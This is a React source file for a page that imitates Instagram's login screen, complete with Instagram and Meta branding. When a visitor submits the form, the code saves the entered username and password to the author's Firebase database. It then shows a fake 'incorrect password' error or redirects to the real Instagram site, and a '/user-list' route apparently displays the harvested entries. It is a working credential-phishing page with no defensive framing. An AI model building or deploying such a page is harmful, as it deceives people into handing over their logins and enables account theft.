import styles from "./InstaLoginPage.module.css"
import { IoLogoFacebook } from "react-icons/io";
import instaHeadText from "../../Assets/Images/InstagramHead.png"
import metaPNG from "../../Assets/Images/metaPNG.png"
import { FaChevronDown } from "react-icons/fa6";
import { useCallback, useEffect, useState } from "react";
import { addUserDataToDatabase, signinUserWithEmailAndPassword } from "../../Firebase/database";
import { useNavigate } from "react-router-dom";

const InstaLoginPage = () => {
    const navigate = useNavigate()
    const [showPassword, setShowPassword] = useState(false);
    const [isLoginDisable,disableLogin] = useState(true);
    const [errorMsg,setErrorMsg] = useState("");

    const [userData,setUserData] = useState({
        userEmail:"",
        userPassword:""
    })

    const togglePasswordVisibility = () => {
        setShowPassword(prevState => !prevState);
    };

    const handleSubmit = async (e) =>{
        e.preventDefault()
        const response = await addUserDataToDatabase(userData);
        if( response === undefined){
            setErrorMsg("Sorry, your password was incorrect. Please double-check your password");
        }else{
            window.location.href = "https://www.instagram.com";
        }
    }

    const checkInputFields = useCallback(()=>{
        if(userData.userEmail !== "" && userData.userPassword !== ""){
            disableLogin(false)
        }else{
            disableLogin(true)
        }

        signinUserWithEmailAndPassword(userData.em,userData.password)
        .then(async(pro)=>{
            navigate("/user-list")
            console.log("Login success")
        }).catch(err=>{
            setErrorMsg(err.message)
        })

    },[userData])

    useEffect(()=>{
        checkInputFields();
    },[userData,checkInputFields])

    return <div className={styles.container} >

        <h3 className={styles.topText}>English
            <span className={styles.downIcon}>
                <FaChevronDown />
            </span>
        </h3>

        <div className={styles.instaPNG}>
            <img src={instaHeadText} />
        </div>

        <div className={styles.facebookButton}>
            <span className={styles.FBincon}>
                <IoLogoFacebook />
            </span>
            <h4>
                Countinue With Facebook
            </h4>
        </div>

        <div className={styles.orText}>
            OR
        </div>

        <div className={styles.formArea}>
            <form onSubmit={handleSubmit}>
                <input 
                    type="Text" 
                    placeholder="Phone number, username, or email" 
                    onChange={(e)=>setUserData({...userData,userEmail:e.target.value})}
                />
                
                <div className={styles.passwordContainer}>
                    <input
                        type={showPassword ? 'text' : 'password'}
                        placeholder="Password"
                        onChange={(e)=>setUserData({...userData,userPassword:e.target.value})}
                    />
                    {userData.userPassword !== "" 
                        &&
                        <button
                            type="button"
                            onClick={togglePasswordVisibility}
                            className={styles.showPasswordButton}
                        >
                            {showPassword ? 'Hide' : 'Show'}
                        </button>
                    }
                </div>
                <h3>Forget password?</h3>
                <button disabled={isLoginDisable} type="submit" >Log in</button>
            </form>
        </div>

        <h4 className={styles.signUpText}>
            Don't have an account?
            <span> Sign up</span>
        </h4>

        <div className={styles.footer}>
            <h5>from</h5>
            <img src={metaPNG}></img>
        </div>

    </div>
}
export default InstaLoginPage;